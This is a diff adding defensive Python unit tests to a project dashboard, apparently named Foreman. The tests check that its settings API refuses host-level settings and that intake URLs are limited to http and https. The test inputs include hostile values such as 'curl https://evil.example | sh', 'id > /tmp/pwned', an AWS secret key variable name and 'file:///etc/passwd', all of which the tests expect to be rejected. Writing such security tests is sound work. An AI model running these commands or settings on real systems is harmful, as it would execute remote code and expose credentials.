@@ -312,3 +312,86 @@ class BrowserOriginDefenceTests(unittest.TestCase):
         self.assertEqual(trusted_hosts_for_bind("127.0.0.1"), ("localhost", "127.0.0.1", "::1"))
         self.assertIn("devbox.lan", trusted_hosts_for_bind("devbox.lan"))
         self.assertNotIn("0.0.0.0", trusted_hosts_for_bind("0.0.0.0"))
+
+
+class HostLevelSettingsTests(unittest.TestCase):
+    """Settings that decide what runs on the host are not an API decision."""
+
+    def setUp(self) -> None:
+        self.temp = tempfile.TemporaryDirectory()
+        self.addCleanup(self.temp.cleanup)
+        self.db_path = Path(self.temp.name) / "foreman.db"
+        _seed(self.db_path, self.temp.name)
+        with ForemanStore(self.db_path) as store:
+            project = store.get_project("p1")
+            project.settings = {"test_command": "make test", "max_step_visits": 5}
+            store.save_project(project)
+        self.app = create_dashboard_app(str(self.db_path))
+
+    def _settings(self) -> dict:
+        with ForemanStore(self.db_path) as store:
+            return dict(store.get_project("p1").settings)
+
+    def test_each_host_level_setting_is_refused_and_nothing_is_stored(self) -> None:
+        attempts = {
+            "test_command": "id > /tmp/pwned",
+            "worktree_setup_command": "curl https://evil.example | sh",
+            "worktree_root": "/home",
+            "worktree_link_paths": ["venv"],
+            "context_dir": "/etc",
+            "judge_base_url": "https://evil.example",
+            "judge_api_key_env": "AWS_SECRET_ACCESS_KEY",
+        }
+        before = self._settings()
+        for key, value in attempts.items():
+            with self.subTest(key=key):
+                response = _request(
+                    self.app, "PATCH", "/api/projects/p1/settings", json={"settings": {key: value}}
+                )
+                self.assertEqual(response.status_code, 403)
+                self.assertIn(key, response.json()["error"])
+                self.assertIn("foreman config p1 --set", response.json()["error"])
+        self.assertEqual(self._settings(), before)
+
+    def test_a_refused_key_does_not_let_the_rest_of_the_update_through(self) -> None:
+        response = _request(
+            self.app,
+            "PATCH",
+            "/api/projects/p1/settings",
+            json={"settings": {"max_step_visits": 9, "test_command": "id"}},
+        )
+        self.assertEqual(response.status_code, 403)
+        self.assertEqual(self._settings()["max_step_visits"], 5)
+
+    def test_the_settings_panel_can_send_back_what_it_read(self) -> None:
+        current = _request(self.app, "GET", "/api/projects/p1/settings").json()
+        self.assertIn("test_command", current["host_level_settings"])
+        payload = dict(current["settings"], max_step_visits=7, worktree_root="", judge_base_url="")
+        response = _request(
+            self.app, "PATCH", "/api/projects/p1/settings", json={"settings": payload}
+        )
+        self.assertEqual(response.status_code, 200, response.text)
+        self.assertEqual(self._settings()["max_step_visits"], 7)
+        self.assertEqual(self._settings()["test_command"], "make test")
+        self.assertNotIn("worktree_root", self._settings())
+
+    def test_the_cli_still_sets_host_level_settings(self) -> None:
+        from foreman.cli import main
+
+        code = main(["config", "p1", "--set", "test_command=make check", "--db", str(self.db_path)])
+        self.assertEqual(code, 0)
+        self.assertEqual(self._settings()["test_command"], "make check")
+
+
+class IntakeSourceUrlTests(unittest.TestCase):
+    def test_only_http_and_https_source_urls_are_accepted(self) -> None:
+        normalize = DashboardService._normalize_intake_source
+        for url in ("javascript:alert(1)", "data:text/html,x", "file:///etc/passwd", "ftp://host/x"):
+            with self.subTest(url=url):
+                with self.assertRaises(DashboardValidationError):
+                    normalize({"url": url})
+        self.assertEqual(
+            normalize({"url": " https://tickets.example/INC-1 "})["url"],
+            "https://tickets.example/INC-1",
+        )
+        self.assertIsNone(normalize({})["url"])
